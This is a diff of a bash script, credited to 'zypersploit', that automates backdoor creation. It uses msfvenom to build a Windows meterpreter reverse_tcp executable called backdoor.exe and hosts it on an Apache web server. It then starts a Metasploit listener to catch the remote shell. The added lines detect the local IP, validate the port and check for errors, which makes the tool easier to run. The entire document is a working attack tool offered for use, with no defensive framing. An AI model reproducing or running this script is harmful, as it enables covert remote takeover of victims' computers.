@@ -1,15 +1,69 @@
 #!/bin/bash
 
 clear
+
 echo -e "\033[33mRunning setup and backdoor creation...\033[0m"
 echo -e "\033[34mMade by zypersploit!\033[0m"
 echo
-cd ~
-sudo msfvenom -p windows/meterpreter/reverse_tcp LHOST=YOUR_KALI_LINUX_INET_ADDRESS LPORT=YOUR_PORT -f exe -o backdoor.exe
-mv backdoor.exe /var/www/html/
+
+check_command() {
+    command -v "$1" >/dev/null 2>&1 || { echo "Error: $1 is not installed. Please install it and try again."; exit 1; }
+}
+
+check_command "msfvenom"
+check_command "msfconsole"
+check_command "apache2"
+
+detect_eth0_ip() {
+    local ip
+    ip=$(ip a show eth0 | grep 'inet ' | awk '{print $2}' | cut -d/ -f1)
+    echo "$ip"
+}
+
+echo "Detecting local IP address (LHOST)..."
+LHOST=$(detect_eth0_ip)
+
+if [ -z "$LHOST" ]; then
+    echo "Error: Unable to detect the local IP address (LHOST). Please check your network configuration."
+    exit 1
+fi
+
+echo "Local IP address detected as LHOST: $LHOST"
+
+echo "Please enter the port number (LPORT) to use for the listener (default: 4444):"
+read LPORT
+
+if [[ ! "$LPORT" =~ ^[0-9]+$ ]] || [ "$LPORT" -lt 1024 ] || [ "$LPORT" -gt 65535 ]; then
+    echo "Invalid port number. Using default port 4444."
+    LPORT=4444
+fi
+
 clear
-cd /var/www/html/
-chmod +x backdoor.exe
-clear
-service apache2 start
-msfconsole -q -x "use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp; set LHOST YOUR_KALI_LINUX_INET_ADDRESS; set LPORT YOUR_PORT; clear; exploit"
+
+echo "Creating payload with LHOST=$LHOST and LPORT=$LPORT..."
+
+sudo msfvenom -p windows/meterpreter/reverse_tcp LHOST="$LHOST" LPORT="$LPORT" -f exe -o backdoor.exe
+
+if [ ! -f "backdoor.exe" ]; then
+    echo "Error: Failed to create payload. Please check your msfvenom installation and try again."
+    exit 1
+fi
+
+echo "Moving payload to /var/www/html/..."
+sudo mv backdoor.exe /var/www/html/
+
+echo "Setting executable permissions for the payload..."
+sudo chmod +x /var/www/html/backdoor.exe
+
+echo "Starting Apache2 service..."
+if ! pgrep -x "apache2" > /dev/null; then
+    sudo service apache2 start
+else
+    echo "Apache2 is already running."
+fi
+
+echo "Setting up Metasploit listener..."
+
+msfconsole -q -x "use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp; set LHOST $LHOST; set LPORT $LPORT; exploit"
+
+echo -e "\033[32mSetup complete! Listener is running...\033[0m"
